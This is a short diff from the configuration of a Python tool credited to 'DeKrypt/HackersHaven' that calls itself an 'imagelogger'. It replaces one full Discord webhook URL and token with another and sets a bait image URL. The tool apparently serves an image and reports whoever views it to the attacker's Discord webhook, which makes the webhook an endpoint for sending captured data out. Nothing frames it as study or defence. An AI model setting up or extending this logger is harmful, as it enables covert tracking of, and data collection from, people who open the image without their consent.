@@ -12,7 +12,7 @@ __author__ = "DeKrypt/HackersHaven"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1406250925747736596/Fk1_M1qpsi7Vzaquz_OKumEHXymUpyqnLZN0b_4mJKYEWN-k0ifphjq0AxYQzoZyKdlB",
+    "webhook": "https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w",
     "image": "https://w0.peakpx.com/wallpaper/929/175/HD-wallpaper-foto-dia-fotos-oscuro-sol.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
